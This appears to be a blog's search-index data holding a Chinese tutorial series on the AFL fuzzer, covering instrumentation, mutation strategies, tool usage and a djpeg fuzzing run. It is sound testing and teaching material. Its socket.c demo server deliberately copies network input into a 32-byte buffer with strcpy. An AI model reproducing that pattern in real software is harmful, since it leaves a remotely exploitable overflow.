Captured 68 tuples in 'map/id:000005,src:000000+000001,op:splice,rep:64'. ------------------------------------- id:000021,src:000011,op:flip32,pos:2,+cov afl-showmap 2.56b by \u003clcamtuf@google.com\u003e [*] Executing '/usr/bin/djpeg'... -- Program output begins -- Premature end of JPEG file JPEG datastream contains no image -- Program output ends -- [+] Captured 59 tuples in 'map/id:000021,src:000011,op:flip32,pos:2,+cov'. ------------------------------------- id:000026,src:000021,op:havoc,rep:2 afl-showmap 2.56b by \u003clcamtuf@google.com\u003e [*] Executing '/usr/bin/djpeg'... -- Program output begins -- Premature end of JPEG file JPEG datastream contains no image -- Program output ends -- [+] Captured 60 tuples in 'map/id:000026,src:000021,op:havoc,rep:2'. ------------------------------------- 可以看到上面样本id为21和26的输出结果相同，但是执行路径不同，可以使用 diff 指令进行路径对比： diff -Nu map/id\\:000021\\,src\\:000011\\,op\\:flip32\\,pos\\:2\\,+cov map/id\\:000026\\,src\\:000021\\,op\\:havoc\\,rep\\:2 结果如下： --- map/id:000021,src:000011,op:flip32,pos:2,+cov 2019-12-03 06:38:42.236000000 +0000 +++ map/id:000026,src:000021,op:havoc,rep:2 2019-12-03 06:38:42.388000000 +0000 @@ -1,20 +1,21 @@ 003224:1 004793:1 005209:1 -005993:1 +005993:2 006601:1 007073:1 008498:1 008874:1 -010130:1 +010130:2 010146:1 010282:1 -013459:1 +013459:2 +014971:1 017564:1 018892:1 019132:1 019148:1 -019172:1 +019172:2 019188:1 019236:1 019804:1 @@ -33,18 +34,18 @@ 032872:1 033112:1 037297:1 -037433:1 +037433:2 037817:1 039585:1 -039641:2 -043450:1 +039641:4 +043450:2 043562:1 044194:1 044818:1 045483:1 046955:1 047603:1 -048251:1 +048251:2 051300:1 052444:1 053124:1 从最初的只有文本内容“test”的样本，afl确实已经发现了很多其它路径，但是在我的测试结果中还是没有fuzz出正常的图片文件，从输出结果上看样本id为21和26算是比较接近，没有报明显错误。 Premature end of JPEG file JPEG datastream contains no image ","date":"2020-12-04","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/:3:1","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/"},{"categories":["Fuzz"],"content":"参考链接 https://github.com/google/AFL https://www.secpulse.com/archives/71903.html https://www.freebuf.com/articles/system/191536.html http://zeroyu.xyz/2019/05/15/how-to-use-afl-fuzz https://lcamtuf.blogspot.com/2014/11/pulling-jpegs-out-of-thin-air.html https://paper.seebug.org/841/ https://paper.seebug.org/496/#part-2afl https://rk700.github.io/2017/12/28/afl-internals/ https://rk700.github.io/2018/01/04/afl-mutations/ https://rk700.github.io/2018/02/02/afl-enhancement/ ","date":"2020-12-04","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/:3:2","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/"},{"categories":["Fuzz"],"content":"AFL二三事系列 note 2","date":"2020-12-04","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/"},{"categories":["Fuzz"],"content":"本文是AFL系列第二篇，主要介绍AFL的一些基本原理。 ","date":"2020-12-04","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/:0:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/"},{"categories":["Fuzz"],"content":"一、代码覆盖率 ","date":"2020-12-04","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/:1:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/"},{"categories":["Fuzz"],"content":"1. 计算方法 代码覆盖率的计量单位，通常有3种： 函数（Fuction-Level） 基本块（BasicBlock-Level） 边界（Edge-Level） （1）函数（Fuction-Level） 这个很容易理解，就是代码执行时调用到哪些函数，但是函数里面的具体代码行却不作统计，相对比较粗糙但高效的统计方式。 所以，通常的统计方式是用基本块，简称BB。 （2）基本块（BasicBlock-Level） 基本块，直接看下图就很容易理解了。 IDA中每一块代码就代表着一个基本块，就是以指令跳转为作划分界限的。 （3）边界（Edge-Level） edge本身就涵盖了基本块部分，唯一的差别是edge多记录了一些执行边界的信息。比如示例代码： 在IDA中可以看到A、B、C这3个基本块，但当a为假时，程序就会从A执行到C。 前面基本块的方式就无法确切地知道是否曾从A执行到C，尤其是该段代码被多次执行的情况，就更无法知道，这时edge覆盖方式就出现了。 edge会在A跟C之间建立虚拟块D，通过判断D是否执行过，来确认是否曾从A执行到C，这种方式也会比较消耗性能。 以上内容摘自泉哥博客，原文链接https://riusksk.me/2018/07/29/honggfuzz%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF1/ AFL采用的是第三种方式。 ","date":"2020-12-04","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/:1:1","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/"},{"categories":["Fuzz"],"content":"2. AFL中两种代码覆盖率计算方式 AFL支持两种代码覆盖率计算方式，有源码的情况下，在源代码编译时进行插桩，无源码的情况下，使用QEMU进行二进制插桩。下一章节会分别详细讲解这两种情况使用的插桩技术。 ","date":"2020-12-04","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/:1:2","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/"},{"categories":["Fuzz"],"content":"二、插桩 ","date":"2020-12-04","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/:2:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/"},{"categories":["Fuzz"],"content":"1. 有源码 我们以如下代码为例进行说明，文件名为 socket.c #include\u003cstdio.h\u003e#include\u003cstdlib.h\u003e#include\u003cstring.h\u003e#include\u003cunistd.h\u003e#include\u003csys/socket.h\u003e#include\u003cnetinet/in.h\u003e #define SERV_PORT 8000 #define SIZE 100 #define MAXLINE 64 int command(char* buf) { char recv[32]; memset(recv, 32, 0); strcpy(recv, buf + 8); return 0; } int main() { struct sockaddr_in servaddr,cliaddr; socklen_t cliaddr_len; int listenfd,connfd; char buf[MAXLINE]; int i,n,flag = 0; listenfd = socket(AF_INET,SOCK_STREAM,0); bzero(\u0026servaddr,sizeof(servaddr)); servaddr.sin_family = AF_INET; servaddr.sin_addr.s_addr = htonl(INADDR_ANY); servaddr.sin_port = htons(SERV_PORT); bind(listenfd,(struct sockaddr *)\u0026servaddr,sizeof(servaddr)); listen(listenfd,20); printf(\"Accepting connections..\\n\"); cliaddr_len = sizeof(cliaddr); connfd = accept(listenfd,(struct sockaddr *)\u0026cliaddr,\u0026cliaddr_len); char send_msg[MAXLINE*2] = \"hello, send by send() :\\n\"; send(connfd, send_msg, strlen(send_msg), 0); n = read(connfd,buf,MAXLINE); if(n!=0){ if(!strncmp(buf, \"test \", 5)) sprintf(send_msg, \"test: %s\\n\", buf + 5); else if(!strncmp(buf, \"help\", 4)) sprintf(send_msg, \"help:\\n\\ttest\\n\\tcommand\\n\\texit\\n\"); else if(!strncmp(buf, \"command \", 8)){ command(buf); sprintf(send_msg, \"it's a command\\n\"); } else if(!strncmp(buf, \"exit\", 4)) send(connfd, \"bye~\\n\", 4, 0); else sprintf(send_msg, \"unknown command!\\n\"); send(connfd, send_msg, strlen(send_msg), 0); } else printf(\"Client say close the connection..\\n\"); close(connfd); } 可以进行源码插桩的指令有 afl-gcc、afl-g++、afl-clang、afl-clang++ ( afl-clang-fast 和 afl-clang-fast++ 暂不讨论)，通过查看这些文件的具体属性，可以发现后三者都是 afl-gcc 的软链接，其实都是同一个二进制文件： 通过分析 afl-gcc.c 中的代码可以发现， afl-gcc 就是在原有的编译指令上增加一些编译选项然后调用对应的系统调用指令： 为了方便查看每次源码编译时的编译选项，可以对 afl-gcc.c 进行修改，在 main() 函数中调用 execvp() 之前添加如下代码，打印出实际执行的编译指令： //print command for(int i = 0; i \u003c cc_par_cnt; i++){ printf(\"%s \", cc_params[i]); } printf(\"\\n\"); 其中数组 cc_params 存放着编译指令和选项，整数 cc_par_cnt 存放数组有效值，修改完成后对AFL重新进行编译即可。 （afl-clang-fast 和 afl-clang-fast++ 对应的源码文件为 llvm_mode/afl-clang-fast.c ，修改方法相同） 使用 afl-gcc 对上面代码进行编译 afl-gcc -o socket_afl socket.c 可以看到实际执行的编译指令为 gcc -o socket socket.c -B /usr/local/lib/afl -g -O3 -funroll-loops -D__AFL_COMPILER=1 -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1 ，其中 -B \u003cdirectory\u003e 选项用于将添加到编译器的搜索路径，-g 选项生成调试信息，-O3 优化生成代码，-funroll-loops 选项展开循环的迭代次数可以在编译时或进入循环时确定，剩余两个为AFL使用的选项。（gcc的选项可以参考此链接 https://gcc.gnu.org/onlinedocs/gcc-4.4.2/gcc/Optimize-Options.html） 如果了解编译过程，那么就知道把源代码编译成二进制，主要是经过”源代码”-\u003e”汇编代码”-\u003e”二进制”这样的过程。而将汇编代码编译成为二进制的工具，即为汇编器assembler。Linux系统下的常用汇编器是as。不过，编译完成AFL后，在其目录下也会存在一个as文件，并作为符号链接指向afl-as。所以，如果通过-B选项为gcc设置了搜索路径，那么afl-as便会作为汇编器，执行实际的汇编操作。 所以，AFL的代码插桩，就是在将源文件编译为汇编代码后，通过 afl-as 完成。 afl-as 下面通过对比 gcc 和 afl-gcc 的编译结果进行大致分析。 将 afl-gcc 中添加的 -B、-D__AFL_COMPILER=1、DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1 三个选项去掉，调用 gcc gcc -o socket socket.c -g -O3 -funroll-loops 这样就生成了 socket_afl 和 socket 两个文件。 使用 bindiff 对这两个文件中的 main 函数进行对比 上图中右下角部分看起来结构不一样，不过这里是 bindiff 识别bug，多出了一个代码块并且少了一条线，我们可以分别使用 ida 打开这两个文件，查看 main 函数的结构图 这里对 bindiff 误报结果的详细分析就不多说了，这个不是本次的重点。 可以看到 afl 进行源代码插桩时不会改变代码的逻辑结构，也不会增加或减少代码块。 对比看下每个代码块中代码的区别 可以看出，基本每个代码块都被添加了一段相似的汇编代码 在 ida 中将这部分代码拷贝出来，如下： lea rsp, [rsp-98h] mov [rsp+1D0h+var_1D0], rdx mov [rsp+1D0h+var_1C8], rcx mov [rsp+1D0h+var_1C0], n mov rcx, 650Eh call __afl_maybe_log mov n, [rsp+1D0h+var_1C0] mov rcx, [rsp+1D0h+var_1C8] mov rdx, [rsp+1D0h+var_1D0] lea rsp, [rsp+98h] 对比可以发现，不同的代码块只有 mov rcx, 650Eh 这条汇编代码向 rcx 存放的值不同，这个就是随机生成的标识代码块的id，当运行到这部分汇编时 afl 就知道是哪个代码块被执行了。 上述 ida 中的汇编代码原型可以在 afl-as.h 中找到（以64位代码为例）： 上述代码执行的主要功能包括： 保存 rdx、 rcx 、rax 寄存器 将 rcx 的值设置为 fprintf() 函数将要打印的变量内容 调用 __afl_maybe_log 函数 恢复寄存器 在以上的功能中， __afl_maybe_log 是插桩代码所执行的实际内容，后续将详细展开。 可以在 afl-as.c 中查看到该汇编的调用，通过 fprintf() 函数的调用，将格式化字符串添加到汇编文件的相应位置。 这里分析下 R(MAP_SIZE) ，它就是上面汇编代码中将 rcx 设置的值。根据定义， MAP_SIZE 为64K，而对于 R(x) 函数定义如下： 其中 R(MAP_SIZE) 相当于 random() % (1 \u003c\u003c MAP_SIZE_POW2) ，也就是生成随机数，所以标识代码块的id是随机生成的（两次编译生成的代码段id不同）。 上述过程总结起来就是在处理到某个分支需要插入桩代码时， afl-as 会随机生成一个随机数，作为运行时保存在 rcx 中的值。而这个随机数，便是用于标识这个代码块的id。 （备注：因为代码块ID随机的问题，会导致一定的","date":"2020-12-04","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/:2:1","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/"},{"categories":["Fuzz"],"content":"2. 无源码 无源码情况下，AFL使用QEMU进行二进制插桩，具体插桩原理待补充。 ","date":"2020-12-04","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/:2:2","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/"},{"categories":["Fuzz"],"content":"三、变异策略 AFL维护了一个队列(queue)，每次从这个队列中取出一个文件，对其进行大量变异，并检查运行后是否会引起目标崩溃、发现新路径等结果。变异的主要类型如下： bitflip，按位翻转，1变为0，0变为1 arithmetic，整数加/减算术运算 interest，把一些特殊内容替换到原文件中 dictionary，把自动生成或用户提供的token替换/插入到原文件中 havoc，中文意思是“大破坏”，此阶段会对原文件进行大量变异 splice，中文意思是“拼接”，此阶段会将两个文件拼接起来得到一个新的文件 其中，前四项 bitflip, arithmetic, interest, dictionary 是非 dumb mode（-d）和主 fuzzer（-M）会进行的操作，由于其变异方式没有随机性，所以也称为 deterministic fuzzing ；havoc 和 splice 则存在随机性，是所有状况的 fuzzer（是否 dumb mode、主从 fuzzer）都会执行的变异。 以下将对这些变异类型进行具体介绍。 ###（1） bitflip 拿到一个原始文件，首先进行的就是bitflip，而且还会根据翻转量/步长进行多种不同的翻转，按照顺序依次为： bitflip 1/1， 每次翻转1个bit，按照每1个bit的步长从头开始 bitflip 2/1， 每次翻转相邻的2个bit，按照每1个bit的步长从头开始 bitflip 4/1， 每次翻转相邻的4个bit，按照每1个bit的步长从头开始 bitflip 8/8， 每次翻转相邻的8个bit，按照每8个bit的步长从头开始，即依次对每个byte做翻转 bitflip 16/8，每次翻转相邻的16个bit，按照每8个bit的步长从头开始，即依次对每个word做翻转 bitflip 32/8，每次翻转相邻的32个bit，按照每8个bit的步长从头开始，即依次对每个dword做翻转 在上述过程中，AFL巧妙地嵌入了一些对文件格式的启发式判断，以图尽可能多得获取文件信息。 自动检测token 在进行 bitflip 1/1变异时，对于每个 byte 的最低位( least significant bit )翻转还进行了额外的处理：如果连续多个 bytes 的最低位被翻转后，程序的执行路径都未变化，而且与原始执行路径不一致，那么就把这一段连续的 bytes 判断是一条token。 例如，PNG文件中用IHDR作为起始块的标识，那么就会存在类似于以下的内容： ........IHDR........ 当翻转到字符I的最高位时，因为IHDR被破坏，此时程序的执行路径肯定与处理正常文件的路径是不同的；随后，在翻转接下来3个字符的最高位时，IHDR标识同样被破坏，程序应该会采取同样的执行路径。由此，AFL就判断得到一个可能的token：IHDR，并将其记录下来为后面的变异提供备选。 AFL采取的这种方式是非常巧妙的：就本质而言，这实际上是对每个byte进行修改并检查执行路径；但集成到bitflip后，就不需要再浪费额外的执行资源了。此外，为了控制这样自动生成的token的大小和数量，AFL还在config.h中通过宏定义了限制： /* Length limits for auto-detected dictionary tokens: */ #define MIN_AUTO_EXTRA 3 #define MAX_AUTO_EXTRA 32 /* Maximum number of auto-extracted dictionary tokens to actually use in fuzzing (first value), and to keep in memory as candidates. The latter should be much higher than the former. */ #define USE_AUTO_EXTRAS 10 #define MAX_AUTO_EXTRAS (USE_AUTO_EXTRAS * 10) 对于一些文件来说，我们已知其格式中出现的token长度不会超过4，那么我们就可以修改 MAX_AUTO_EXTRA 为4并重新编译AFL，以排除一些明显不会是token的情况。遗憾的是，这些设置是通过宏定义来实现，所以不能做到运行时指定，每次修改后必须重新编译AFL。 生成effector map 在进行bitflip 8/8变异时，AFL还生成了一个非常重要的信息：effector map。这个effector map几乎贯穿了整个deterministic fuzzing的始终。 具体地，在对每个byte进行翻转时，如果其造成执行路径与原始路径不一致，就将该byte在effector map中标记为1，即“有效”的，否则标记为0，即“无效”的。 这样做的逻辑是：如果一个byte完全翻转，都无法带来执行路径的变化，那么这个byte很有可能是属于”data”，而非”metadata”（例如size, flag等），对整个fuzzing的意义不大。所以，在随后的一些变异中，会参考effector map，跳过那些“无效”的byte，从而节省了执行资源。 由此，通过极小的开销（没有增加额外的执行次数），AFL又一次对文件格式进行了启发式的判断。看到这里，不得不叹服于AFL实现上的精妙。 不过，在某些情况下并不会检测有效字符。第一种情况就是dumb mode或者从fuzzer，此时文件所有的字符都有可能被变异。第二、第三种情况与文件本身有关： /* Minimum input file length at which the effector logic kicks in: */ #define EFF_MIN_LEN 128 /* Maximum effector density past which everything is just fuzzed unconditionally (%): */ #define EFF_MAX_PERC 90 即默认情况下，如果文件小于128 bytes，那么所有字符都是“有效”的；同样地，如果AFL发现一个文件有超过90%的bytes都是“有效”的，那么也不差那10%了，大笔一挥，干脆把所有字符都划归为“有效”。 ###（2） arithmetic 在bitflip变异全部进行完成后，便进入下一个阶段：arithmetic。与bitflip类似的是，arithmetic根据目标大小的不同，也分为了多个子阶段： arith 8/8，每次对8个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个byte进行整数加减变异 arith 16/8，每次对16个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个word进行整数加减变异 arith 32/8，每次对32个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个dword进行整数加减变异 加减变异的上限，在config.h中的宏ARITH_MAX定义，默认为35。所以，对目标整数会进行+1, +2, …, +35, -1, -2, …, -35的变异。特别地，由于整数存在大端序和小端序两种表示方式，AFL会贴心地对这两种整数表示方式都进行变异。 此外，AFL还会智能地跳过某些arithmetic变异。第一种情况就是前面提到的effector map：如果一个整数的所有bytes都被判断为“无效”，那么就跳过对整数的变异。第二种情况是之前bitflip已经生成过的变异：如果加/减某个数后，其效果与之前的某种bitflip相同，那么这次变异肯定在上一个阶段已经执行过了，此次便不会再执行。 ###（3） interest 下一个阶段是interest，具体可分为： interest 8/8，每次对8个bit进替换，按照每8个bit的步长从头开始，即对文件的每个byte进行替换 interest 16/8，每次对16个bit进替换，按照每8个bit的步长从头开始，即对文件的每个word进行替换 interest 32/8，每次对32个bit进替换，按照每8个bit的步长从头开始，即对文件的每个dword进行替换 而用于替换的”interesting values”，是AFL预设的一些比较特殊的数： static s8 interesting_8[] = { INTERESTING_8 }; static s16 interesting_16[] = { INTERESTING_8, INTERESTING_16 }; static s32 interesting_32[] = { INTERESTING_8, INTERESTING_16, INTERESTING_32 }; 这些数的定义在config.h文件中： /* List of interesting values to use in fuzzing. */ #define INTERESTING_8 \\ -128, /* Overflow signed 8-bit when decremented */\\ -1, /* */\\ 0, /* */\\ 1, /* */\\ 16, /* One-off with common buffer size */\\ 32, /* One-off with common buffer size */\\ 64, /* One-off w","date":"2020-12-04","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/:3:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/"},{"categories":["Fuzz"],"content":"效果分析 参考 https://lcamtuf.blogspot.com/2014/11/pulling-jpegs-out-of-thin-air.html 中的测试方法，同样以 djpeg 为目标，最初的样本集只有一个文本 test，采用二进制插桩的方式进行fuzz，1个主节点以及3个从节点同时进行，测试最终是否能fuzz出一个合法的图片文件。 fuzz后的样本集合如下： 使用 afl-showmap 对所有样本进行分析，编写脚本如下： #!/bin/bash path=$1 dpath=$2 rm -rf $2/* for file in $(ls $1) do echo -e '\\n'$file afl-showmap -o $2/$file -Q -- /usr/bin/djpeg $1/$file echo -e '-------------------------------------\\n' done 第一个参数为样本集合目录，第二个参数为输出目录，假设脚本名为 djpeg.sh ，样本目录为 in ，输出目录为 map ./djpeg.sh in map 脚本的执行结果可在 分析/djpeg_sh脚本输出结果.txt 中查看，以下只展示部分： id:000000,orig:1 afl-showmap 2.56b by \u003clcamtuf@google.com\u003e [*] Executing '/usr/bin/djpeg'... -- Program output begins -- Not a JPEG file: starts with 0x74 0x65 -- Program output ends -- [+] Captured 50 tuples in 'map/id:000000,orig:1'. ------------------------------------- id:000001,src:000000,op:havoc,rep:64,+cov afl-showmap 2.56b by \u003clcamtuf@google.com\u003e [*] Executing '/usr/bin/djpeg'... -- Program output begins -- Corrupt JPEG data: 2 extraneous bytes before marker 0xfe JPEG datastream contains no image -- Program output ends -- [+] Captured 68 tuples in 'map/id:000001,src:000000,op:havoc,rep:64,+cov'. ------------------------------------- id:000005,src:000000+000001,op:splice,rep:64 afl-showmap 2.56b by \u003clcamtuf@google.com\u003e [*] Executing '/usr/bin/djpeg'... -- Program output begins -- Corrupt JPEG data: 6 extraneous bytes before marker 0xfe JPEG datastream contains no image -- Program output ends -- [+] Captured 68 tuples in 'map/id:000005,src:000000+000001,op:splice,rep:64'. ------------------------------------- id:000021,src:000011,op:flip32,pos:2,+cov afl-showmap 2.56b by \u003clcamtuf@google.com\u003e [*] Executing '/usr/bin/djpeg'... -- Program output begins -- Premature end of JPEG file JPEG datastream contains no image -- Program output ends -- [+] Captured 59 tuples in 'map/id:000021,src:000011,op:flip32,pos:2,+cov'. ------------------------------------- id:000026,src:000021,op:havoc,rep:2 afl-showmap 2.56b by \u003clcamtuf@google.com\u003e [*] Executing '/usr/bin/djpeg'... -- Program output begins -- Premature end of JPEG file JPEG datastream contains no image -- Program output ends -- [+] Captured 60 tuples in 'map/id:000026,src:000021,op:havoc,rep:2'. ------------------------------------- 可以看到上面样本id为21和26的输出结果相同，但是执行路径不同，可以使用 diff 指令进行路径对比： diff -Nu map/id\\:000021\\,src\\:000011\\,op\\:flip32\\,pos\\:2\\,+cov map/id\\:000026\\,src\\:000021\\,op\\:havoc\\,rep\\:2 结果如下： --- map/id:000021,src:000011,op:flip32,pos:2,+cov 2019-12-03 06:38:42.236000000 +0000 +++ map/id:000026,src:000021,op:havoc,rep:2 2019-12-03 06:38:42.388000000 +0000 @@ -1,20 +1,21 @@ 003224:1 004793:1 005209:1 -005993:1 +005993:2 006601:1 007073:1 008498:1 008874:1 -010130:1 +010130:2 010146:1 010282:1 -013459:1 +013459:2 +014971:1 017564:1 018892:1 019132:1 019148:1 -019172:1 +019172:2 019188:1 019236:1 019804:1 @@ -33,18 +34,18 @@ 032872:1 033112:1 037297:1 -037433:1 +037433:2 037817:1 039585:1 -039641:2 -043450:1 +039641:4 +043450:2 043562:1 044194:1 044818:1 045483:1 046955:1 047603:1 -048251:1 +048251:2 051300:1 052444:1 053124:1 从最初的只有文本内容“test”的样本，afl确实已经发现了很多其它路径，但是在我的测试结果中还是没有fuzz出正常的图片文件，从输出结果上看样本id为21和26算是比较接近，没有报明显错误。 Premature end of JPEG file JPEG datastream contains no image ","date":"2020-12-04","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/:3:1","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/"},{"categories":["Fuzz"],"content":"参考链接 https://github.com/google/AFL https://www.secpulse.com/archives/71903.html https://www.freebuf.com/articles/system/191536.html http://zeroyu.xyz/2019/05/15/how-to-use-afl-fuzz https://lcamtuf.blogspot.com/2014/11/pulling-jpegs-out-of-thin-air.html https://paper.seebug.org/841/ https://paper.seebug.org/496/#part-2afl https://rk700.github.io/2017/12/28/afl-internals/ https://rk700.github.io/2018/01/04/afl-mutations/ https://rk700.github.io/2018/02/02/afl-enhancement/ ","date":"2020-12-04","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/:3:2","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/"},{"categories":["Fuzz"],"content":"AFL二三事系列 note 1","date":"2020-12-02","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 1","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/"},{"categories":["Fuzz"],"content":"本文是AFL系列第一篇，主要介绍AFL的基本使用。 ","date":"2020-12-02","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/:0:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 1","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/"},{"categories":["Fuzz"],"content":"一、简介 AFL（American Fuzzy Lop）是由安全研究员Michal Zalewski（@lcamtuf）开发的一款基于覆盖引导（Coverage-guided）的模糊测试工具，它通过记录输入样本的代码覆盖率，从而调整输入样本以提高覆盖率，增加发现漏洞的概率。 ","date":"2020-12-02","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/:1:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 1","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/"},{"categories":["Fuzz"],"content":"二、工作流程 对于有源码的情况下，AFL的工作流程大致如下： 源码编译时进行插桩； 选择输入文件，构建语料库，加入输入队列； 对队列中的文件按照一定的策略进行“变异”； 如果经过变异的文件更新了代码覆盖路径，则保留文件并添加到队列中； 循环执行上述过程，记录触发crash的文件。 ","date":"2020-12-02","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/:2:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 1","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/"},{"categories":["Fuzz"],"content":"三、使用 ","date":"2020-12-02","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/:3:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 1","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/"},{"categories":["Fuzz"],"content":"1. 基本使用 AFL安装完成后，生成的可执行程序及其作用整体概括如下： 下面对每个可执行文件做详细的使用描述： 1. 编译指令 afl-gcc、afl-g++、afl-clang、afl-clang++、afl-clang-fast、afl-clang-fast++这些afl的编译指令，支持使用gcc、g++、clang、clang++的任何选项，因为这些指令的本质还是调用当前系统的对应编译指令，比如使用afl-gcc进行源码插桩编译： # 指令格式： afl-gcc [参数] 源文件 afl-gcc test.c -o test 2. afl-cmin, afl-tmin afl-cmin和afl-tmin都是用于简化样本的，可以简单的理解为前者裁剪样本集合，将执行路径相同的样本剔除掉只保留一个，后者是对单个样本的裁剪，例如，in_afl目录下存放样本，使用afl-cmin对样本集合进行裁剪，将新的集合输出到in_afl_min中，然后使用afl-tmin对in_afl_min中名为1.jpeg的文件进行裁剪，输出到1_new.jpeg文件中，fuzz的目标程序为/usr/bin/djpeg，该程序使用方法为/usr/bin/djpeg [参数] 要解析的图片文件： # 指令格式： afl-cmin -i 样本目录 -o 输出目录 [-Q] -- 要fuzz的可执行程序 [程序参数] # 指令格式： afl-tmin -i 样本文件 -o 输出文件 [-Q] -- 要fuzz的可执行程序 [程序参数] # 其中 '要fuzz的可执行程序' 必须是带有路径的，不能直接使用，比如 'djpeg 1.jpeg' 可以执行成功，但是fuzz时必须将 'djpeg' 的路径一并带上才可以，即 '/usr/bin/djpeg' # 默认情况下afl-cmin和afl-tmin会把样本以标准输出的方式喂给要fuzz的程序，如果fuzz程序是从参数指定的文件中读取数据进行处理的，则需要使用 '@@' 来代替输入的文件路径，比如原本执行的指令为 'djpeg in_afl_min/1.jpeg' ，fuzz时指令应为 '/usr/bin/djpeg @@' # 在安装了qemu-mode时，可以支持 '-Q' 选项，如果目标可执行程序 # 当然这两个指令还有一些其它参数，这里就不介绍使用了，以上为常见用法 afl-cmin -i in_afl -o in_afl_min -Q -- /usr/bin/djpeg @@ afl-tmin -i in_afl_min/1.jpeg -o in_afl_min/1_new.jpeg -Q -- /usr/bin/djpeg @@ 3. afl-analyze afl-analyze用于分析样本，比如分析一个样本1.jpeg，被fuzz程序为/usr/bin/djpeg，该程序使用方法为/usr/bin/djpeg [参数] 要解析的图片文件 # 指令格式： afl-analyze -i 样本文件 [-Q] -- 要fuzz的可执行程序 [程序参数] # 其中 '要fuzz的可执行程序' 必须是带有路径的，不能直接使用，比如 'djpeg 1.jpeg' 可以执行成功，但是fuzz时必须将 'djpeg' 的路径一并带上才可以，即 '/usr/bin/djpeg' # 默认情况下afl-cmin和afl-tmin会把样本以标准输出的方式喂给要fuzz的程序，如果fuzz程序是从参数指定的文件中读取数据进行处理的，则需要使用 '@@' 来代替输入的文件路径，比如原本执行的指令为 'djpeg in_afl_min/1.jpeg' ，fuzz时指令应为 '/usr/bin/djpeg @@' # 在安装了qemu-mode时，可以支持 '-Q' 选项，如果目标可执行程序 afl-analyze -i in_afl_min/1.jpeg -Q -- /usr/bin/djpeg @@ 4. afl-showmap afl-showmap用于分析样本的执行路径，比如分析一个样本1.jpeg，被fuzz程序为/usr/bin/djpeg，该程序使用方法为/usr/bin/djpeg [参数] 要解析的图片文件 # 指令格式（从标准输入中读取）： afl-showmap -o 存放结果的文件 -- 要fuzz的可执行程序 [程序参数] \u003c 样本文件路径 # 指令格式（从参数指定文件中读取输入）： afl-showmap -o 存放结果的文件 -- 要fuzz的可执行程序 [程序参数] # 其中 '要fuzz的可执行程序' 必须是带有路径的，不能直接使用，比如 'djpeg 1.jpeg' 可以执行成功，但是fuzz时必须将 'djpeg' 的路径一并带上才可以，即 '/usr/bin/djpeg' # 在安装了qemu-mode时，可以支持 '-Q' 选项，如果目标可执行程序 # 因为/usr/bin/djpeg指令即可用参数指定文件，也可以直接标准输入，所以以下两种方式均可 afl-showmap -o map -Q -- /usr/bin/djpeg in_afl_min/1.jpeg afl-showmap -o map -Q -- /usr/bin/djpeg \u003c in_afl_min/1.jpeg # 查看结果 cat map 5. afl-fuzz 